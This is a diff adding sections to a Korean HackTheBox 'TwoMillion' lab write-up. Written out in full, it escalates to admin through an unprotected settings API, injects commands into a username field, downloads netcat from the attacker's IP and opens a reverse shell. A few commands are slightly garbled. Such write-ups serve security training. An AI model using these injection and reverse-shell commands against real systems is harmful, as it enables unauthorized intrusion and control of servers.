@@ -246,9 +246,175 @@ In order to generate the invite code, make a POST request to /api/v1/invite/gene
 ![](../assets/image_post/20240326090034.png)
 
 
-## [0x0] 
+## [0x03] get admin role
 ---
 
+HTB와 유사한 페이지를 돌아다니다 보면 `/api/v1/user/vpn/generate`라는 api를 호출하여 ovpn 파일을 다운로드 한다. 이후 `/api/v1` 경로를 호출하면 해당 사이트에서 사용 가능한 api의 목록을 확인할 수 있다. 그 중 admin과 관련된 부분도 있으니 잘 살펴보자.
+``` json
+┌──(root㉿kali)-[/home/user]
+└─# curl -XGET "http://2million.htb/api/v1" --cookie "PHPSESSID=631oojvs6hjl3bvqmfttoiv0q9" | jq
+
+{
+  "v1": {
+    "user": {
+      "GET": {
+        "/api/v1": "Route List",
+        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
+        "/api/v1/invite/generate": "Generate invite code",
+        "/api/v1/invite/verify": "Verify invite code",
+        "/api/v1/user/auth": "Check if user is authenticated",
+        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
+        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
+        "/api/v1/user/vpn/download": "Download OVPN file"
+      },
+      "POST": {
+        "/api/v1/user/register": "Register a new user",
+        "/api/v1/user/login": "Login with existing user"
+      }
+    },
+    "admin": {
+      "GET": {
+        "/api/v1/admin/auth": "Check if user is admin"
+      },
+      "POST": {
+        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
+      },
+      "PUT": {
+        "/api/v1/admin/settings/update": "Update user settings"
+      }
+    }
+  }
+}
+```
+
+admin 관련된 항목 중 내 자신이 admin인지 체크하는 항목으로 추정되는 api가 보여 호출하였으나, 당연히 false가 나타난다.
+``` bash
+┌──(root㉿kali)-[/home/user]
+└─# curl -XGET "http://2million.htb/api/v1/admin/auth" --cookie "PHPSESSID=631oojvs6hjl3bvqmfttoiv0q9"
+{"message":false}
+```
+
+그러던 중 user 단 api에 유사한 `/api/v1/user/auth` 라는 api가 보이기에 호출해보았다. 오...😃 `is_admin`이라는 항목이 매우 변조마렵게 생겼다. 뭔가 `/api/v1/admin/settings/update` 라는 api를 쓰면 되지 않을까싶다.
+``` bash
+┌──(root㉿kali)-[/home/user]
+└─# curl -XGET "http://2million.htb/api/v1/user/auth" --cookie "PHPSESSID=631oojvs6hjl3bvqmfttoiv0q9"
+{"loggedin":true,"username":"readmin","is_admin":0}
+```
+
+바로 put method를 통해 is_admin을 '1'로 변조하여 전송해보았다. content type을 맞춰주고 다시 전송해보니 email이란 파라미터의 부재를 알려준다. 
+``` bash
+┌──(root㉿kali)-[/home/user]
+└─# curl -XPUT "http://2million.htb/api/v1/admin/settings/update" --cookie "PHPSESSID=631oojvs6hjl3bvqmfttoiv0q9" -d '{"loggedin":true,"username":"readmin","is_admin":1}'
+{"status":"danger","message":"Invalid content type."}
+
+┌──(root㉿kali)-[/home/user]
+└─# curl -XPUT "http://2million.htb/api/v1/admin/settings/update" --cookie "PHPSESSID=631oojvs6hjl3bvqmfttoiv0q9" -d '{"loggedin":true,"username":"readmin","is_admin":1}' -H "Content-Type: application/json"
+{"status":"danger","message":"Missing parameter: email"}
+```
+
+email 파라미터를 추가하여 전송하였더니...Good..👍 이제 admin으로 진화하였다.
+``` bash 
+┌──(root㉿kali)-[/home/user]
+└─# curl -XPUT "http://2million.htb/api/v1/admin/settings/update" --cookie "PHPSESSID=631oojvs6hjl3bvqmfttoiv0q9" -d '{"loggedin":true,"username":"readmin","is_admin":1, "email":"readmin@readmin.com"}' -H "Content-Type: application/json"
+{"id":13,"username":"readmin","is_admin":1}
+
+┌──(root㉿kali)-[/home/user]
+└─# curl -XGET GEttp://2million.htb/api/v1/admin/auth" --cookie "PHPSESSID=631oojvs6hjl3bvqmfttoiv0q9"
+{"message":true}
+```
+
+
+## [0x04] connect shell
+---
+
+`/api/v1/admin/vpn/generate` api는 어떤 기능인지 알아보자. ovpn 파일을 생성하는 api로 보인다.
+``` bash
+┌──(root㉿kali)-[/home/user]
+└─# curl -XPOST "http://2million.htb/api/v1/admin/vpn/generate" --cookie "PHPSESSID=631oojvs6hjl3bvqmfttoiv0q9" -H "Content-Type: application/json" -d '{"u'{"username":"readmin"}'
+client
+dev tun
+proto udp
+remote edge-eu-free-1.2million.htb 1337
+resolv-retry infinite
+nobind
+persist-key
+persist-tun
+remote-cert-tls server
+comp-lzo
+verb 3
+data-ciphers-fallback AES-128-CBC
+data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
+tls-cipher "DEFAULT:@SECLEVEL=0"
+auth SHA256
+key-direction 1
+<ca>
+-----BEGIN CERTIFICATE-----
+MIIGADCCA+igAwIBAgIUQxzHkNyCAfHzUuoJgKZwCwVNjgIwDQYJKoZIhvcNAQEL
+BQAwgYgxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxv
+bmRvbjETMBEGA1UECgwKSGFja1RoZUJveDEMMAoGA1UECwwDVlBOMREwDwYDVQQD
+DAgybWlsbGlvbjEhMB8GCSqGSIb3DQEJARYSaW5mb0BoYWNrdGhlYm94LmV1MB4X
+DTIzMDUyNjE1MDIzM1oXDTIzMDYyNTE1MDIzM1owgYgxCzAJBgNVBAYTAlVLMQ8w
+DQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxvbmRvbjETMBEGA1UECgwKSGFja1Ro
+```
+
+다양한 방법으로 username 파라미터에 테스트하였으나, 알 수가 없어 결국 공략을 참고하였다. username에 `;[command];`와 같은 형태로 넣어주면 된다. 맨 뒤에 `;`를 넣지 않아 계속 공격이 되지 않았다...🤢
+``` bash
+┌──(root㉿kali)-[/home/user]
+└─# curl -XPOST "http://2million.htb/api/v1/admin/vpn/generate" --cookie "PHPSESSID=631oojvs6hjl3bvqmfttoiv0q9" -H "Content-Type: application/json" -d '{"username":"readmin;ls;"}'
+
+Database.php
+Router.php
+VPN
+assets
+controllers
+css
+fonts
+images
+index.php
+js
+views
+```
+
+이제 어떻게든 명령어를 넣을 수 있으니 nc 를 옮겨주고 shell을 얻어보자.
+``` bash
+# Victim
+┌──(root㉿kali)-[/home/user] # nc 다운로드
+└─# curl -XPOST "http://2million.htb/api/v1/admin/vpn/generate" --cookie "PHPSESSID=631oojvs6hjl3bvqmfttoiv0q9" -H "Content-Type: application/json" -d '{"username":"readmin;/tmpcurl -o /tmp/nc http://10.10.14.36:8000/nc;"}'
+
+
+┌──(root㉿kali)-[/home/user] # 실행 권한 부여
+└─# curl -XPOST "http://2million.htb/api/v1/admin/vpn/generate" --cookie "PHPSESSID=631oojvs6hjl3bvqmfttoiv0q9" -H "Content-Type: application/json" -d '{"username":"readmin;chmod +x /tmp/nc;"}'
+
+┌──(root㉿kali)-[/home/user] # reverse shell 연결
+└─# curl -XPOST "http://2million.htb/api/v1/admin/vpn/generate" --cookie "PHPSESSID=631oojvs6hjl3bvqmfttoiv0q9" -H "Content-Type: application/json" -d '{"username":"readmin;/tmp/nc 10.10.14.36 443 -e /bin/bash;"}'
+
+# Hacker
+┌──(root㉿kali)-[/home/user]
+└─# nc -lvp 443
+listening on [any] 443 ...
+connect to [10.10.14.36] from 2million.htb [10.10.11.221] 51304
+
+whoami      <--- 첫 명령어 입력
+www-data
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'  <--- 두번째 명령어 입력
+
+www-data@2million:~/html$ export TERM=xterm
+www-data@2million:~/html$
+```
+
+
+
+
+
+```
+root         937       1  0 05:02 ?        00:00:00 /usr/sbin/ModemManager
+memcache    1153       1  0 05:02 ?        00:00:07 /usr/bin/memcached -m 64 -p
+11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid
+root        1157       1  0 05:02 ?        00:00:00 /usr/sbin/cron -f -P
+root        1158       1  0 05:02 ?        00:00:02 php-fpm: master process (/etc/php/8.1/fpm/php-fpm.conf)
+root        1178       1  0 05:02 ?        00:00:00 nginx: master process /usr/s
+```
 
 
 
